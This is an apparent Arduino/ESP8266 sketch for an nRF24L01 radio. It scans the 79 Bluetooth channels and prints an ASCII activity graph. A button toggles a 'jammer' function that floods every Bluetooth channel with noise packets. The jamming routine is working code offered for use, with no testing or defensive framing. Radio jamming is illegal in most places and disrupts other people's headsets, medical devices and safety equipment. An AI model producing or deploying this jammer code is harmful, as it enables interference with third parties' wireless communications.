#include <SPI.h>
#include <RF24.h>
#include <nRF24L01.h>

#define CE_PIN D1 // GPIO 5
#define CSN_PIN D2 // GPIO 4

RF24 radio(CE_PIN, CSN_PIN);

#define BLUETOOTH_CHANNELS 79 // Bluetooth uses channels 0-78
int channel[BLUETOOTH_CHANNELS];

char grey[] = " .:-=+*aRW";

#define _NRF24_CONFIG      0x00
#define _NRF24_EN_AA       0x01
#define _NRF24_EN_RXADDR   0x02
#define _NRF24_RF_CH       0x05
#define _NRF24_RF_SETUP    0x06
#define _NRF24_RPD         0x09

#define BT1 D4 // GPIO 2
#define BT2 D3 // GPIO 0

int channels = 0;
bool jamming = false;

byte getRegister(byte r) {
    byte c;
    digitalWrite(CSN_PIN, LOW);
    c = SPI.transfer(r & 0x1F);
    c = SPI.transfer(0);
    digitalWrite(CSN_PIN, HIGH);
    return c;
}

void setRegister(byte r, byte v) {
    digitalWrite(CSN_PIN, LOW);
    SPI.transfer((r & 0x1F) | 0x20);
    SPI.transfer(v);
    digitalWrite(CSN_PIN, HIGH);
}

void setup() {
    Serial.begin(57600);
    radio.begin();
    radio.startListening();
    radio.stopListening();

    pinMode(BT1, INPUT_PULLUP);
    pinMode(BT2, INPUT_PULLUP);

    attachInterrupt(digitalPinToInterrupt(BT1), pressBt01, FALLING);
    attachInterrupt(digitalPinToInterrupt(BT2), pressBt02, FALLING);

    for (int count = 0; count < BLUETOOTH_CHANNELS; count++) {
        channel[count] = 0;
    }

    Serial.println("Starting Bluetooth Channel Scanner ...");
    Serial.println();

    SPI.begin();
    SPI.setDataMode(SPI_MODE0);
    SPI.setClockDivider(SPI_CLOCK_DIV2);
    SPI.setBitOrder(MSBFIRST);

    pinMode(CE_PIN, OUTPUT);
    disable();
    powerUp();
    setRegister(_NRF24_EN_AA, 0x0);
    setRegister(_NRF24_RF_SETUP, 0x0F);
}

void powerUp(void) {
    setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x02);
    delayMicroseconds(130);
}

void disable(void) {
    digitalWrite(CE_PIN, LOW);
}

void enable(void) {
    digitalWrite(CE_PIN, HIGH);
}

void scanBluetoothChannels(void) {
    disable();
    for (int j = 0; j < 255; j++) { // Perform multiple scans
        for (int i = 0; i < BLUETOOTH_CHANNELS; i++) {
            setRegister(_NRF24_RF_CH, i); // Set to Bluetooth channel
            enable();
            delayMicroseconds(40);
            disable();
            if (getRegister(_NRF24_RPD) > 0) channel[i]++; // Check for signal
        }
    }
}

void outputBluetoothChannels(void) {
    int norm = 0;
    for (int i = 0; i < BLUETOOTH_CHANNELS; i++)
        if (channel[i] > norm) norm = channel[i];

    Serial.print('|');
    for (int i = 0; i < BLUETOOTH_CHANNELS; i++) {
        int pos;
        if (norm != 0) pos = (channel[i] * 10) / norm;
        else pos = 0;

        if (pos == 0 && channel[i] > 0) pos++;
        if (pos > 9) pos = 9;

        Serial.print(grey[pos]);
        channel[i] = 0; // Reset for next scan
    }
    Serial.print("| ");
    Serial.println(norm);
}

void jammer() {
    const char text[] = "xxxxxxxxxxxxxxxx"; // Noise data to send
    for (int i = 0; i < BLUETOOTH_CHANNELS; i++) {
        radio.setChannel(i); // Jam all Bluetooth channels
        radio.write(&text, sizeof(text));
    }
}

void pressBt01() {
    static unsigned long last_interrupt_time = 0;
    unsigned long interrupt_time = millis();
    if (interrupt_time - last_interrupt_time > 200) {
        if (channels < 13) {
            channels++;
        } else {
            channels = 0;
        }
    }
    last_interrupt_time = interrupt_time;
}

void pressBt02() {
    jamming = !jamming; // Toggle jamming state
    delay(200); // Debounce delay
}

void loop() {
    Serial.print("Channel: ");
    Serial.println(channels + 1);

    if (jamming) {
        Serial.print("JAMMING BLUETOOTH CHANNELS ");
        jammer(); // Call the jamming function
    } else {
        scanBluetoothChannels();
        outputBluetoothChannels();
    }
}
